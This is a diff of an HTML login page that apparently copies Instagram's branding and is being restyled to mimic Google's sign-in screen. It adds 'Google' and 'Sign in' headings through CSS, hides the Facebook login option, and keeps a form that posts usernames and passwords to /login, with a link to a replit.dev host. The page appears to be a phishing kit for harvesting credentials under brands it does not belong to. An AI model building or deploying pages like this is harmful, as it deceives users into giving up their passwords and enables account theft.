@@ -5,149 +5,122 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Instagram</title>
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Instagram</title>
-
   <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      font-family: Roboto, Arial, sans-serif;
     }
 
     body {
-      background-color: #000;
-      color: #fff;
+      background-color: #fff;
+      color: #202124;
+      height: 100vh;
       display: flex;
       justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-size: 14px;
+      align-items: flex-start;
     }
 
     .container {
-      background-color: #111;
-      border-radius: 8px;
       width: 100%;
-      max-width: 350px;
-      padding: 40px 40px 30px;
-      text-align: center;
-      box-shadow: 0 0 20px rgba(255, 255, 255, 0.05);
+      max-width: 420px;
+      padding: 40px 24px;
+      text-align: left;
     }
 
     .logo {
-      width: 180px;
-      height: auto;
-      margin-bottom: 30px;
-      user-select: none;
-      -webkit-user-drag: none;
-      filter: invert(1);
+      width: 75px;
+      margin: 40px auto 20px;
+      display: block;
+      filter: none;
+    }
+
+    .container::before {
+      content: "Google";
+      display: block;
+      text-align: center;
+      font-size: 28px;
+      font-weight: 500;
+      margin-bottom: 10px;
+      letter-spacing: -0.5px;
+    }
+
+    .container::after {
+      content: "Sign in";
+      display: block;
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    form {
+      margin-top: 30px;
     }
 
     input[type="text"],
-    input[type="Password"] {
+    input[type="password"] {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 12px;
-      border: none;
+      padding: 14px 12px;
+      margin-top: 20px;
+      border: 1px solid #dadce0;
       border-radius: 4px;
-      background-color: #1c1c1c;
-      color: #fff;
-      font-size: 14px;
+      font-size: 16px;
+      background: #fff;
+      color: #202124;
     }
 
-    input[type="text"]::placeholder,
-    input[type="Password"]::placeholder {
-      color: #888;
-    }
-
-    input[type="text"]:focus,
-    input[type="Password"]:focus {
+    input:focus {
       outline: none;
-      background-color: #222;
+      border: 2px solid #1a73e8;
+    }
+
+    input::placeholder {
+      color: #5f6368;
     }
 
     input[type="submit"] {
-      width: 100%;
-      padding: 10px;
-      background-color: #405de6;
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: auto;
+      padding: 10px 24px;
+      background-color: #1a73e8;
       color: #fff;
       border: none;
-      border-radius: 6px;
-      font-weight: 600;
+      border-radius: 4px;
+      font-weight: 500;
+      font-size: 14px;
       cursor: pointer;
-      margin-top: 10px;
-      transition: background 0.3s ease;
     }
 
     input[type="submit"]:hover {
-      background-color: #3142c4;
+      background-color: #1669c1;
     }
 
-    .divider {
-      display: flex;
-      align-items: center;
-      text-align: center;
-      margin: 20px 0;
-      color: #888;
-      font-size: 12px;
-    }
-
-    .divider::before,
-    .divider::after {
-      content: "";
-      flex: 1;
-      border-bottom: 1px solid #333;
-      margin: 0 10px;
-    }
-
+    .divider,
     .facebook-login {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #1877f2;
-      font-weight: 600;
-      margin-bottom: 15px;
-      cursor: pointer;
-      text-decoration: none;
-      font-size: 14px;
-    }
-
-    .facebook-login img {
-      width: 18px;
-      height: 18px;
-      margin-right: 8px;
-      filter: invert(19%) sepia(88%) saturate(3554%) hue-rotate(203deg) brightness(96%) contrast(101%);
+      display: none;
     }
 
     .forgot-password {
-      color: #999;
-      font-size: 13px;
+      display: block;
+      margin-top: 12px;
+      color: #1a73e8;
+      font-size: 14px;
       text-decoration: none;
-      margin-bottom: 15px;
-      display: inline-block;
-    }
-
-    .forgot-password:hover {
-      text-decoration: underline;
     }
 
     .footer {
-      margin-top: 10px;
-      font-size: 12px;
-      color: #888;
+      margin-top: 40px;
+      font-size: 14px;
+      color: #1a73e8;
     }
 
     .signup-link {
-      color: #0095f6;
-      font-weight: 600;
+      color: #1a73e8;
+      font-weight: 500;
       text-decoration: none;
-      cursor: pointer;
     }
 
     .signup-link:hover {
@@ -155,14 +128,15 @@
     }
   </style>
 </head>
+
 <body>
   <div class="container">
     <img src="instagram-text-icon.svg" alt="Instagram Text Logo" class="logo" />
 
     <form action="/login" method="POST">
-      <input type="text" name="username" placeholder="Phone number, Email or Username" required />
-      <input type="password" name="passcode" placeholder="Passcode" required />
-      <input type="submit" value="Log In" />
+      <input type="text" name="username" placeholder="Email or phone" required />
+      <input type="password" name="passcode" placeholder="Enter your password" required />
+      <input type="submit" value="Next" />
     </form>
 
     <div class="divider">OR</div>
@@ -171,38 +145,11 @@
       <img src="facebook-icon1.svg" alt="Facebook Logo" /> Log in with Facebook
     </a>
 
-    <a href="#" class="forgot-password">Forgot password?</a>
+    <a href="#" class="forgot-password">Forgot email?</a>
 
     <div class="footer">
-      Don't have an account? 
-      <a href="https://3039e9e2-3fcb-4591-9642-c447fc3ced90-00-1lclvursct2nf.sisko.replit.dev/" class="signup-link">Sign Up</a>
-    </div>
-  </div>
-</body>
-</html>
-
-</head>
-<body>
-  <div class="container">
-    <img src="instagram-text-icon.svg" alt="Instagram Text Logo" class="logo" />
-
-    <form action="/login" method="POST">
-      <input type="text" name="username" placeholder="Phone number, Email or Username" required />
-      <input type="password" name="passcode" placeholder="Passcode" required />
-      <input type="submit" value="Log In" />
-    </form>
-
-    <div class="divider">OR</div>
-
-    <a href="#" class="facebook-login">
-      <img src="facebook-icon1.svg" alt="Facebook Logo" /> Log in with Facebook
-    </a>
-
-    <a href="#" class="forgot-password">Forgot password?</a>
-
-    <div class="footer">
-      Don't have an account? 
-      <a href="https://3039e9e2-3fcb-4591-9642-c447fc3ced90-00-1lclvursct2nf.sisko.replit.dev/" class="signup-link">Sign Up</a>
+      Create account
+      <a href="https://3039e9e2-3fcb-4591-9642-c447fc3ced90-00-1lclvursct2nf.sisko.replit.dev/" class="signup-link"></a>
     </div>
   </div>
 </body>
